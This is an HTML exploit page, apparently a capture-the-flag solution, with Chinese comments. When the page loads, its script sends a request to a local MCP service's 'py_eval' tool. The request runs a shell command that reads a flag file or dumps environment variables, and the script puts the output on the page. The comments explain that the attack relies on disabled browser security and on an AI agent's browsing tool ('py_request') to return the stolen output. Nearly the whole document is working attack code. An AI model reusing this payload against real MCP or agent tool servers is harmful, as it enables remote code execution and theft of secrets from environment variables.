<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <div id="output">Waiting for flag...</div>
    <script>
        async function attack() {
            // 目标是本地的 MCP 服务接口
            const target = "http://127.0.0.1:8001/mcp";
            
            // 构造 py_eval 的 payload，尝试读取 flag
            // 尝试常见位置 /flag, /readflag, 或查看环境变量
            const cmd = "import os; res = os.popen('cat /flag || /readflag || env').read(); del os";
            
            const payload = {
                "id": "1",
                "params": {
                    "name": "py_eval",
                    "arguments": {
                        "code": cmd
                    }
                }
            };

            try {
                // 发送 POST 请求
                // 由于 --disable-web-security，这里允许跨域请求 localhost
                const response = await fetch(target, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();
                
                // 提取结果并覆盖页面内容
                // py_request 会截取页面内容返回给用户
                // 结果通常在 data.result.content[0].text 中，且是 JSON 字符串
                const executionResult = data.result.content[0].text;
                document.body.innerHTML = executionResult;
                
            } catch (e) {
                document.body.innerHTML = "Error: " + e.toString();
            }
        }
        
        // 执行攻击
        attack();
    </script>
</body>
</html>
